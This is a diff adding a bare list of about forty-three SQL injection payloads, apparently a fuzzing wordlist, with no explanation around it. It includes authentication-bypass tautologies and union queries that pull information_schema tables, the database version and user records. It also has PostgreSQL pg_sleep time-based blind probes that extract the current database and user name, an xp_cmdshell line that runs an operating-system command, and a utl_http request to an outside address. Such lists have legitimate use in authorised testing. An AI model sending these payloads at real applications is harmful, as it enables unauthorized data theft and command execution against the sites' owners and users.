@@ -1,0 +1,44 @@
+a
+a'
+a' --
+a' or 1=1; --
+@
+?
+' and 1=0) union all
+? or 1=1 --
+x' and userid is NULL; --
+x' and email is NULL; --
+anything' or 'x'='x
+x' and 1=(select count(*) from tabname); --
+x' and members.email is NULL; --
+x' or full_name like '%bob%
+23 or 1=1; --
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+' or '1'='1
+'||utl_http.request('httP://192.168.1.1/')||'
+' or 1=1--
+" or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+admin' or '
+' select * from information_schema.tables--
+) union select * from information_schema.tables;
+' union all select @@version--
+' union select * from users where login = char(114,111,111,116);
+' union select 
+'/**/or/**/1/**/=/**/1
+' or 1/*
+or 1=1--
+uni/**/on sel/**/ect
+1 AND 1=(SELECT 1 FROM pg_sleep(5))-- 
+' AND 1=(SELECT 1 FROM pg_sleep(5))-- 
+1 AND 31337=(SELECT 31337 FROM pg_sleep(5))-- 
+'||(SELECT 1 FROM pg_sleep(5))--
+' AND 1=(SELECT CASE WHEN (SELECT length(current_database()))>5 THEN pg_sleep(5) ELSE 0 END)-- 
+' AND 1=(SELECT CASE WHEN (SELECT substring(current_user,1,1))='a' THEN pg_sleep(5) ELSE 0 END)--
+'||(SELECT pg_sleep(5))||'
+'||(SELECT 1 FROM pg_sleep(5))--
+' AND 1=(SELECT CASE WHEN (SELECT length(current_user))>3 THEN pg_sleep(5) ELSE 0 END)-- 
+' AND 1=(SELECT CASE WHEN (SELECT substring(current_database(),1,1))='a' THEN pg_sleep(5) ELSE 0 END)--
+
